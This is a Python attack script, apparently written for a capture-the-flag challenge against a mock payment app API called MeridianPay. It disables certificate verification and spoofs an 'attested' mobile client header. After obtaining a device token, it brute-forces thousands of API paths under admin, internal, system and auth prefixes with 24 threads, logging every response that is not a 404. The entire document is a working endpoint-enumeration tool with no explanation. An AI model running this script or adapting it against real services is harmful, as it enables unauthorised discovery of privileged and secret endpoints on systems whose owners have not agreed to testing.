import json,ssl,urllib.request,urllib.error,itertools
from concurrent.futures import ThreadPoolExecutor
BASE="https://web-3f25599ac74e8a91.web.h7tex.com"
CTX=ssl.create_default_context();CTX.check_hostname=False;CTX.verify_mode=ssl.CERT_NONE
CL="MeridianPay-Android/3.2.1 (attested)"
def raw(p,m="GET",b=None,t=None):
    h={"Content-Type":"application/json","X-Meridian-Client":CL}
    if t:h["Authorization"]="Bearer "+t
    d=json.dumps(b).encode() if b is not None else None
    r=urllib.request.Request(BASE+p,data=d,method=m,headers=h)
    try:
        with urllib.request.urlopen(r,context=CTX,timeout=8) as f:return f.status,f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:return e.code,e.read().decode("utf-8","replace")
    except Exception as e:return None,repr(e)
_,t=raw("/api/v1/auth/device","POST",{"device_id":"d3"});T=json.loads(t)["token"]

NOUN="receipt receipts session sessions device devices token tokens keystore prefs storage shared_prefs provider content export share intent link deeplink webview app mobile client attestation attest risk fraud kyc onboarding loyalty promo promotion referral referrals reward rewards wallet wallet_balance card cards transfer transfers transaction transactions statement statements invoice invoices document documents file files key keys secret secrets config debug metrics health admin internal root system master corporate executive staff vault archive backup snapshot audit log logs activity trail note notes memo memos account accounts profile user users balance balances iban swift routing signature signature_check device_check session_check phone_number phone verify verified enrollment enrollments campaigns offers bonus bonus_points premium tier plans subscriptions subscription webhook webhooks callback".split()
TAILS=["me","current","self","latest","flag","export","all","list","raw","full","v1","1","1001","1000","0","admin","summary","detail","details","get","fetch","dump","data","public","private","internal","secret","key","check","status","info"]
HEADS=["/api/v1/","/api/v1/internal/","/api/v1/admin/","/api/v1/auth/","/api/v1/mobile/","/api/v1/client/","/api/v1/system/"]
paths=set()
for h in HEADS:
    for n in NOUN:
        paths.add(h+n)
        for tl in TAILS:
            paths.add(h+n+"/"+tl)
paths=sorted(paths)
print("paths",len(paths))
hits=[]
def work(p):
    c,b=raw(p,"GET",None,T)
    if c and c!=404 and "404 Not Found" not in b: return (p,c,b[:300])
    return None
with ThreadPoolExecutor(max_workers=24) as ex:
    for r in ex.map(work,paths):
        if r:
            print(r,flush=True); hits.append(r)
json.dump(hits,open("hits.json","w"),indent=1)
print("TOTAL",len(hits))
